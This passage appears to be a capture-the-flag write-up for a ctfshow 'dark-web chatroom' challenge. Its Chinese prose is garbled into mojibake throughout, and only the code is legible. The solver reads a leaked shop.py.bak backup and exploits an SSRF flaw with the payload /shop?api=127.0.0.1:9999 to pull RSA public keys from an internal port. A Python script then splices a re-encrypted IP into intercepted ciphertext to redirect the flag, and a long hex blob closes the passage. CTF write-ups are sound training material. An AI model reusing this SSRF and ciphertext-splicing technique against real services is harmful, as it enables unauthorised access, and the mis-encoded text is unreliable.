<p>ÁÇπËøõÂçöÂÆ¢ÈìæÊé•ÔºåÁõ¥Êé•Â∞±ÊòØÂá∫È¢òÂ∏àÂÇÖÁöÑÂçöÂÆ¢</p>
</li>
<li>
<p>ÊèêÁ§∫‰∫ÜÊú¨Âú∞ËÆøÈóÆ 9999 Á´ØÂè£ÔºåÂèØËÉΩÂ≠òÂú®SSRF</p>
</li>
<li>
<p>‚ÄúÁÇπÊàëËøõÂÖ•ÂÆáÂÆôÂïÜÂüé‚Äù ÈìæÊé•ÂèØ‰ª•ËÆøÈóÆ</p>
</li>
<li>
<p>ÂèëÁé∞‰∫ÜflagÊ†ºÂºèctfshow{}ÔºåflagÂèØËÉΩÂ≠òÂú®‰∫éËÅäÂ§©ÂÆ§ÁöÑÊüê‰∫õÂÆ£‰º†‰∏≠</p>
</li>
<li>
<p>ÁÇπ‰∫Ü‰∏äÈù¢ÁöÑÈÄâÈ°πÔºåÂèëÁé∞Âè™ÊúâÊèí‰ª∂ÂèØ‰ª•Áî®</p>
</li>
</ul>
<h5 id="2ÁÇπÊàëËøõÂÖ•ÂÆáÂÆôÂïÜÂüé-ÈìæÊé•ÂõûÊòæ‰∫ÜËá™Â∑±ÁöÑip">2.‚ÄúÁÇπÊàëËøõÂÖ•ÂÆáÂÆôÂïÜÂüé‚Äù ÈìæÊé•ÔºåÂõûÊòæ‰∫ÜËá™Â∑±ÁöÑIP</h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">È°µÈù¢ÂÜÖÂÆπÔºö
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Êä±Ê≠âÔºåÊú¨ÁΩëÁ´ôÂõ†Ë¢´ÈªëÂÆ¢ÊîªÂáªÊ≠£Âú®Êä¢‰øÆ‰∏≠...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Your IPÔºö2.56.12.89
</span></span><span class="line"><span class="cl">ÊÇ®ÁöÑËÆøÈóÆÂ∑≤ËÆ∞ÂÖ•Êó•Âøó„ÄÇ
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="3ÁÇπÂºÄÊèí‰ª∂ÂèëÁé∞‰∫ÜÊñ∞ÁöÑ‰∏úË•ø">3.ÁÇπÂºÄÊèí‰ª∂ÔºåÂèëÁé∞‰∫ÜÊñ∞ÁöÑ‰∏úË•ø</h5>
<p><img src="/images/%e6%9a%97%e7%bd%91%e8%81%8a%e5%a4%a9%e5%ae%a4-2.png"
	
	
	
	loading="lazy"
	
	
></p>
<p><img src="/images/%e6%9a%97%e7%bd%91%e8%81%8a%e5%a4%a9%e5%ae%a4-3.png"
	
	
	
	loading="lazy"
	
	
></p>
<p><img src="/images/%e6%9a%97%e7%bd%91%e8%81%8a%e5%a4%a9%e5%ae%a4-4.png"
	
	
	
	loading="lazy"
	
	
></p>
<p>ÁªßÁª≠‰∏ÄÊ≥¢‰ø°ÊÅØÊêúÈõÜ</p>
<ul>
<li>
<p>ÊúÄ‰∏äÈù¢ÂèëÁé∞‰∫ÜÁßÅÈí•ÔºåÂéüÂßãÊï∞ÊçÆÔºåÂä†ÂØÜÊï∞ÊçÆ</p>
</li>
<li>
<p>Êúâ‰∏Ä‰∏™‰∏âÂ±Ç‰ª£ÁêÜÁöÑÂü∫Êú¨ÂéüÁêÜÂõæ</p>
</li>
<li>
<p>ËøòÊúâ‰∏Ä‰∏™Âä†ÂØÜËÑöÊú¨</p>
</li>
<li>
<p>ÈÄöËøáËÑöÊú¨ËßÇÂØüÂà∞‰∫ÜÈïøÂ∫¶128‰∏ÄÂä†ÂØÜÔºåÂπ∂‰∏îÊòØutf-8ÁºñÁ†ÅÂä†ÂØÜ</p>
</li>
<li>
<p>ÁúãÂà∞‰πãÂâçÁöÑÂÆ£‰º†ËØ≠ÔºåÂ§çÂà∂ÔºåÊîæÂú®ÊñáÊú¨Êñá‰ª∂ÔºåÂèëÁé∞ÈïøÂ∫¶‰∏∫134&gt;128</p>
</li>
<li>
<p>Â§çÂà∂ÂéüÂßãÊï∞ÊçÆÔºåÂà∞ÊñáÊú¨Êñá‰ª∂ÔºåÂèëÁé∞ÈïøÂ∫¶‰∏∫18944</p>
</li>
<li>
<p>Âà©Áî®Âä†ÂØÜËÑöÊú¨ÔºåÂÖàËá™Â∑±Ë∑ë‰∏Ä‰∏ã</p>
</li>
<li>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.PublicKey</span> <span class="kn">import</span> <span class="n">RSA</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">PKCS1_v1_5</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Âä†ÂØÜ</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">plaintext</span><span class="p">,</span> <span class="n">public_key</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">cipher</span> <span class="o">=</span> <span class="n">PKCS1_v1_5</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">RSA</span><span class="o">.</span><span class="n">importKey</span><span class="p">(</span><span class="n">public_key</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">ciphertext</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">plaintext</span><span class="p">),</span> <span class="mi">128</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">ciphertext</span> <span class="o">+=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">plaintext</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span> <span class="o">+</span> <span class="mi">128</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">ciphertext</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">key</span> <span class="o">=</span> <span class="n">RSA</span><span class="o">.</span><span class="n">generate</span><span class="p">(</span><span class="mi">2048</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">public_key1</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="n">publickey</span><span class="p">()</span><span class="o">.</span><span class="n">export_key</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">private_key1</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="n">export_key</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">encrypt</span><span class="p">(</span><span class="s1">&#39;Get ctfshow{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx} for discover dark web secrets. High quality, low price. Perfect for aspiring hackers!&#39;</span><span class="p">,</span><span class="n">public_key1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ËøêË°åÁªìÊûú</span>
</span></span><span class="line"><span class="cl"><span class="mi">512</span>
</span></span><span class="line"><span class="cl"><span class="mi">1024</span>
</span></span></code></pre></td></tr></table>
</div>
</div></li>
</ul>
<h5 id="4ËÆøÈóÆrobotstxt">4.ËÆøÈóÆrobots.txt</h5>
<p>Âõ†‰∏∫‚ÄúÁÇπÊàëËøõÂÖ•ÂÆáÂÆôÂïÜÂüé‚Äù ÈìæÊé•ÔºåÂõûÊòæ‰∫ÜËá™Â∑±ÁöÑIPÔºåÂä†ÂØÜ‰πüÂêåÊÑèÂà©Áî®‰∫Ü IPÔºåÂèØËÉΩIP‰ºöÊòØÁ™ÅÁ†¥ÁÇπÔºåÊü•Áúã robots.txt</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">È°µÈù¢ÂÜÖÂÆπÔºö
</span></span><span class="line"><span class="cl">user-agent: *
</span></span><span class="line"><span class="cl">Disallow: shop.py.bak
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÁúãÂà∞‰∫Üshop.py.bakÔºåÁªßÁª≠ËÆøÈóÆ‰∏Ä‰∏ã</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">È°µÈù¢ÂÜÖÂÆπ</span><span class="err">Ôºö</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;api&#39;</span><span class="p">,</span> <span class="kc">None</span><span class="p">)</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">api</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;api&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;^[\d\.:]+$&#39;</span><span class="p">,</span> <span class="n">api</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">get</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;http://&#39;</span><span class="o">+</span><span class="n">api</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">html</span> <span class="o">+=</span> <span class="s1">&#39;&lt;!--&#39;</span><span class="o">+</span><span class="n">get</span><span class="o">.</span><span class="n">text</span><span class="o">+</span><span class="s1">&#39;--&gt;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">html</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÊÉ≥Âà∞Êú¨Âú∞ËÆøÈóÆ 9999 Á´ØÂè£ /shop?api=127.0.0.1:9999</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">&#34;Content-Type&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;text/html; charset=utf-8&#34;</span><span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl">ÈùûÂ∏∏Êä±Ê≠âÔºåÊú¨ÁΩëÁ´ôÂõ†Ë¢´ÈªëÂÆ¢ÊîªÂáªÊ≠£Âú®Êä¢‰øÆ‰∏≠...<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">Your IPÔºö2.56.12.89<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">ÊÇ®ÁöÑËÆøÈóÆÂ∑≤ËÆ∞ÂÖ•Êó•Âøó„ÄÇ<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="c">&lt;!--‰Ω†ÂÖàÂ•ΩÂ•ΩÁúãÁúãËá™Â∑±ÁßÅÈí•Âï•Ê†ºÂºèÔºåÂà´Êºè‰∫Ü&#34;\n&#34;
</span></span></span><span class="line"><span class="cl"><span class="c">&#34;public_key1&#34;: &#34;-----BEGIN PUBLIC KEY-----
</span></span></span><span class="line"><span class="cl"><span class="c">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAmz4yT2QVwRhVzGQ0FGm6
</span></span></span><span class="line"><span class="cl"><span class="c">JQWgIxjsVImyeX8a2D61BPLzEBz8Z8RXaNDzmTIzG8itsCptyXcSMhd8bWbKKpdX
</span></span></span><span class="line"><span class="cl"><span class="c">xtwAdmUv85aR07XEEX4h/WgTsZLxZorQls5OUwGbRQ9vtzx79u4/mA5ZJ9cyBsMI
</span></span></span><span class="line"><span class="cl"><span class="c">KLScKf5eH+1nfHqqzlSJXNu+S15obPRVQYAVnXfnygJmq7O33+yYv947e5Gih6ky
</span></span></span><span class="line"><span class="cl"><span class="c">PisXCKWUOAzAYP8qe1yqS4VWxnIgxm1Ozc7BvgJvxhilBIHnligmlEQaSEHxCW07
</span></span></span><span class="line"><span class="cl"><span class="c">ZvJXjTuOyY7VoH5NgmW9c3mv9udvCCFokvB+PCNOej9FUezgUs1sAb4PpAmZLJEU
</span></span></span><span class="line"><span class="cl"><span class="c">JwIDAQAB
</span></span></span><span class="line"><span class="cl"><span class="c">-----END PUBLIC KEY-----&#34;, &#34;
</span></span></span><span class="line"><span class="cl"><span class="c">public_key2&#34;: &#34;-----BEGIN PUBLIC KEY-----
</span></span></span><span class="line"><span class="cl"><span class="c">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA2zfAOrCxswYCYSt6hVJW
</span></span></span><span class="line"><span class="cl"><span class="c">69PhbhRmTD4aDXgThqwRE2Ev16S0uIHSuon7CnkyREiu7FIpG0UBPKAdh2NDZba7
</span></span></span><span class="line"><span class="cl"><span class="c">H9UqPgHjHCeikRlQoBUHordJdJDnaQSOf+/u+feKs3IvY+CuHGAP45h57WHovSfb
</span></span></span><span class="line"><span class="cl"><span class="c">5NSHGA1VGO/9Zl6WJVjMwY0dNvtdDLYycezUeWSRUX+YVZhMOjWQ1xoEwFwo+qWv
</span></span></span><span class="line"><span class="cl"><span class="c">3np+lK3m4Po4I4kN4bdvz14ls5jpzkthIOu1lS6QxSURdA3yms3OWWcWhrZdsEok
</span></span></span><span class="line"><span class="cl"><span class="c">c+1eB84+uzohllO8+ZHE8LXLAnhKjANGJWnwKsiaVq+gl49yMyU8S52TyYd9Mq/z
</span></span></span><span class="line"><span class="cl"><span class="c">7wIDAQAB
</span></span></span><span class="line"><span class="cl"><span class="c">-----END PUBLIC KEY-----&#34;, &#34;
</span></span></span><span class="line"><span class="cl"><span class="c">public_key3&#34;: &#34;-----BEGIN PUBLIC KEY-----
</span></span></span><span class="line"><span class="cl"><span class="c">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEArJXS3k546UPXPpQ/TVjT
</span></span></span><span class="line"><span class="cl"><span class="c">hX2SUbr+s4ItsRUSUogo558qmdWg8EnjwaOo6Pi6cY2aWb1F2Fhsz17NoMYQ6InW
</span></span></span><span class="line"><span class="cl"><span class="c">lZqSR6k1uwxbPZ/xK929b/q+6paxoacU05Hopor3LFq0Uw1rf7ZLp22BTbHyFVID
</span></span></span><span class="line"><span class="cl"><span class="c">xMe/pTuiB1BxlAQiKQ10W5fcJWuuD1E8kFGj37TtlKtu+hPspgC0z8vNnzyI6Z7k
</span></span></span><span class="line"><span class="cl"><span class="c">1JpttlNsofQ2AZTziglwtVbrSJJB6R5kCVIKFlpDjdVPH8aEqISqXlsIikS7yNAk
</span></span></span><span class="line"><span class="cl"><span class="c">4OZLPO0iA4PhLh5DvbczdJB+wBU3HVr/QRwHf7AmI7c1+PS0DtrBrvVFyk6ZhNTt
</span></span></span><span class="line"><span class="cl"><span class="c">dwIDAQAB
</span></span></span><span class="line"><span class="cl"><span class="c">-----END PUBLIC KEY-----&#34;--&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Ê≥®ÈáäÈáåÈù¢Êúâ 3 ‰∏™ÂÖ¨Èí•ÔºåÂèØ‰ª•Ëá™Â∑±Âà©Áî®ËÑöÊú¨ËøõË°åÂä†ÂØÜÔºå</p>
<p>ÈÄöËøáËØ•ÁΩëÁ´ôÁöÑÂÖ¨Èí• 1 ÂíåËá™Â∑±ÁöÑÁßÅÈí• 1 ËøõË°åÂä†Ëß£ÂØÜÔºåÂèØË°åÔºå</p>
<p>ËØ¥ÊòéËØ•ÁΩëÁ´ôÁî®Êà∑ A Â¶ÇÊûúÂØπËá™Â∑± IP ËøõË°åÂä†ÂØÜÔºåÁÑ∂ÂêéÊõøÊç¢‚ÄúËß£ÂØÜÂêéÁöÑÊï∞ÊçÆ‚Äú‰∏≠ÁöÑÁî®Êà∑BÁöÑIPÔºåÊúÄÁªàÊòéÊñá‰ºöÂèëÈÄÅÁªôËá™Â∑±„ÄÇ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.PublicKey</span> <span class="kn">import</span> <span class="n">RSA</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">PKCS1_v1_5</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">abort</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Âä†ÂØÜ</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">plaintext</span><span class="p">,</span> <span class="n">public_key</span><span class="p">):</span>
</span></span><span class="line"><span class="cl"> <span class="n">cipher</span> <span class="o">=</span> <span class="n">PKCS1_v1_5</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">RSA</span><span class="o">.</span><span class="n">importKey</span><span class="p">(</span><span class="n">public_key</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"> <span class="n">ciphertext</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">plaintext</span><span class="p">),</span> <span class="mi">128</span><span class="p">):</span>
</span></span><span class="line"><span class="cl"> <span class="n">ciphertext</span> <span class="o">+=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">plaintext</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">128</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf8&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"> <span class="k">return</span> <span class="n">ciphertext</span>
</span></span><span class="line"><span class="cl"><span class="n">IP</span> <span class="o">=</span> <span class="s1">&#39;2.56.12.89&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">plaintext_half</span> <span class="o">=</span> <span class="s1">&#39;Êã¶Êà™ÁöÑ Ëß£ÂØÜÂêéÁöÑÊï∞ÊçÆ&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># ÂÖ¨Èí•ÂºÄÂ§¥„ÄÅÁªìÂ∞æÊúâ‰ø©\n</span>
</span></span><span class="line"><span class="cl"><span class="n">public_key2</span> <span class="o">=</span> <span class="s1">&#39;-----BEGIN PUBLIC KEY-----</span><span class="se">\n</span><span class="s1">xxx</span><span class="se">\n</span><span class="s1">-----END PUBLIC KEY--</span>
</span></span><span class="line"><span class="cl"><span class="o">---</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">public_key3</span> <span class="o">=</span> <span class="s1">&#39;-----BEGIN PUBLIC KEY-----</span><span class="se">\n</span><span class="s1">xxx</span><span class="se">\n</span><span class="s1">-----END PUBLIC KEY--</span>
</span></span><span class="line"><span class="cl"><span class="o">---</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">IP_ciphertext</span> <span class="o">=</span> <span class="n">encrypt</span><span class="p">(</span><span class="n">IP</span><span class="p">,</span> <span class="n">public_key3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">IP_ciphertext</span> <span class="o">=</span> <span class="n">encrypt</span><span class="p">(</span><span class="n">IP_ciphertext</span><span class="p">,</span> <span class="n">public_key2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># ÊõøÊç¢ÊúÄÁªà IP</span>
</span></span><span class="line"><span class="cl"><span class="n">plaintext_half_new</span> <span class="o">=</span> <span class="n">plaintext_half</span><span class="p">[:</span><span class="mi">2048</span><span class="p">]</span> <span class="o">+</span> <span class="n">IP_ciphertext</span> <span class="o">+</span> 
</span></span><span class="line"><span class="cl"><span class="n">plaintext_half</span><span class="p">[</span><span class="mi">4096</span><span class="p">:]</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">plaintext_half_new</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Â∞ÜÊñ∞ÁîüÊàêÁöÑÊï∞ÊçÆÊõøÊç¢‚ÄúËß£ÂØÜÂêéÁöÑÊï∞ÊçÆ‚ÄùÔºåÂà©Áî®post‰º†ÂèÇÂèëÈÄÅÔºåÁÑ∂ÂêéËÆøÈóÆÔºåËé∑Âèñ FLAGÔºåÂõ†‰∏∫ÊúÄÁªà‰º†ÈÄíÁöÑ IP ÊòØËá™Â∑±„ÄÇ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># Êñ∞ÁîüÊàêÁöÑËß£ÂØÜÂêéÊï∞ÊçÆ
</span></span><span class="line"><span class="cl">624f40b736d3cc973bb4ff63266fd583418692950b182aa482f4a12fa4898e4fa1f281e1996323a5f3ffa7e7a2a2a410004e7d881a3c706c731b47955a68d9dcb2b27d3dab8ee7edc42aaae68c0897b8a53ede59c2b90addcba162279a68bed2eb0babb30dd4dd765563005fd0146ae950c532742b474b05e62344ce8ab65fddbd9da8f3e5cb9c9087b00dd0e432511b89e4889efc16bc8cfdf75348382a8e0b900292897f90bf92479554b68606f788e4725cf31f67848472652c1b6c2433e17f7d19a5c90e6b7ef1650773f0bd9bb46d0efddbbb6b70234f69711a50fe8b63fd294c236cb0eae075116348de5000c7594a5dcfe207e3a73fd0f5b468f400e4547b054da58f6493f2bf77f72f6160d301f10355da74957a13fbe952cc41442c06b96a302d4ded356e5e48a78c03c67434992a9a5069f5529d1c4400c65be639c75c0aba8571a2b6456d07223df26d0857af6efd9214224b1dc3faca135c7bf628c220b12fed7ac95ad676b7b70ae215f5b33cb9fc93730baf38723aa1aa9163bf93c70e7cc37f9c69d804b0715fa3901c6d9e7022d5635b6108ed7688848f27aa5b6cc7e7e20a2a614c610f4493a5e76b50e7717cf97f1ffa1ee106acdd77e246638f386cb0e1a5d9fd4b249a1d2c9423a90636cfa11d58c171a746554916bae0b3c6fb0a469f5ae9c806febb18946adc15df93b1027e4c52c479c1fa57dfe49d2466f3d2e5e917bed4948423b6109f85d30bd94aa4d4e3c5d271db4c9dad8a5e56b6b536515d4596441bc23439f7e2cc4ea57ddf8afdd49937a4cedd0eda267647fdf73701d4dc96f7ff2d0888699a14f5da7eb421b3ed15dc9f0f151845df566ef40d0220dbb3317a3f5dc755060c63d930224df991bdd2a462affbc46100d8b2734695838bda5f4d8f75132597c291123816d7c158fdb893daa568016fda769c690d14cbff5778faea0b21519473f565c4920f1cffd09646ea858bbd908189d6bfd422a2ba8d27e83d4e99aeabb45983e0d5242ed6c4433f369d93df2b6ef92b69914b1b349f39119634568a55ede90fa36f320192124f5c65e4975919fdc22babae4135d3b9a375db27a6d46ee027fd291fa78d3cbc14ec24b89969c364ce56fbebe8ba68589393ffa55cacfe6e9bef0d711e8cacd4fe3339e2aa76c0652e8634fe0d3b19a22e3d4f0baf79f43071c059ce0f85f03567c90b544d225ee97ee2dba9c356dd8db6fc839f55c66318f5d7ba58c1e62e891866a0dc280403c993f9cfd2eac9a766e221c57449efa94e55b17c3bd922f9d6c1ddd79e7b43b27b239cb4c00be876815009dbd8989c470424a5990d1e17a8cc7438fc2fac69d416203f6cfb8332857205212ad72c17fb0b8b301a040ce840de67a9b28e1a1588420f835860162fe767496f64ce28f683ee83b35a37062c6bd48dd4b90e3628987d370664685a0cdc13bb1fc2e8b17b744f9eca3255dcc3ecd455ec6ea29bbfb6cd726b7398eaf3d17f4aec078d591d39e1f0a16c650fbb24dfc384aa04d0aef7f8904ccb26adb9e14da2802af0f1b44eea1acc835abb48bc05ba7a8640ae251ded329f60ef6e2d90ad040317976ead2936c7c6def1214498fab8dc755b81bb6d88f772e1ed913449610ec12a38f2708ea13098e268a2d87314e72b5c74a9a852b91e8ccc35a9279112ac78619fc558116820eed98e70b8f6d1d4ab34ada83ccddd2e33467b6d29a090d65d393c4f1918f650580f0b4e8ad73601987048aa14f1713116a4baaa8a72edbd9e902f0d4dce0bf33edec29451194f41c6c8c5422001f9aa8929d279b43e878e6ad17cfa8626e89a776a23e2a3ce925b9268b923190e2ba279f67d2355a2f3c98576ea0c6944bfae2a1945607414cd32f7eac0714e70fac763e183ec1b745f68b03a3ca9ccae7649b7977dcbf204b4ced74b6a7b3345f5ec7f39240c3d0e3194c413d7d9f367de93a6681318dbfc28de604c40754319f77d6c2d607daeb7b2b87e39cb6d978b995a33ba4f7414ee53956a953b7271962fd8c76cbce84912ffb005ebea6c77639cdba405e968ef746bd9e3228dc0da52698d79ef6a21c93398306d4a93255be6e8e127db6333ca420bd144ac64c13ddebd940c058e983964c0cbafc4342f007a63e17e299c324fb9751226cc6df6d50ba2a50cb90c7ee41460d002954f86388e60c1b3eddf55f0d12faab142a5f54bbd392b5356df12f06b470eae2ace3655dd99ca7a47cf1ef4afab70d9f8e3751211759ef7ecc3746782ee8c6e8bb6daed77643526b8ee5aae2afa6a6b61179e432dd85262e581247de409d80e3094f5d24cae5bfa03e28f6d886d4a5a